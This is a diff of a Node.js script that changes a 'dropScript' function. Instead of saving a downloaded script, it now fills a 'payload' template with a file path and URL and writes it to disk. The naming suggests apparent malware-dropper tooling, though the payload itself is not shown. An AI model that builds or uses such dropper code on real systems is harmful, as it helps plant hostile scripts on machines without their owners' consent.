@@ -1,7 +1,24 @@
 const fs = require('fs');
 const request = require('request-promise');
 const EOL = require('os').EOL;
+const payload = require('./payload');
 
+
+
+
+/*
+ * given a body of text calls replace with a key and value
+ * until the key is no longer found.
+ *
+ * */
+
+const fillTemplate = (body,key,value)=>{
+	/*if the key is in the value the loop would be infinite*/
+	if(value.includes(key)) return body;
+	while(body.includes(key))
+		body = body.replace(key,value);
+	return body;
+}
 
 /*
  *
@@ -54,12 +71,17 @@ const assertArguments = num=>{
 
 
 /*
- * Save a script from a given URL into a given path in a file.
+ * Fills in payload template with payload path and url then writes it to a path.
  *
  * */
-const dropScript = async (path,url)=>{
+const dropScript = async (path,payloadPath,url)=>{
+	const updatedPath = fillTemplate(payloadPath,'\\','/');
+	let payloadData = String(payload);
+	payloadData = payloadData.substring(10,payloadData.length-1);
+	const updatedPayload = fillTemplate(fillTemplate(payloadData,'#path',updatedPath),'#url',url);
+	console.log(updatedPayload);
 	try{
-		fs.writeFileSync(path, await request(url));
+		fs.writeFileSync(path,updatedPayload);
 		return true;
 	} catch (e){
 		console.error(e);
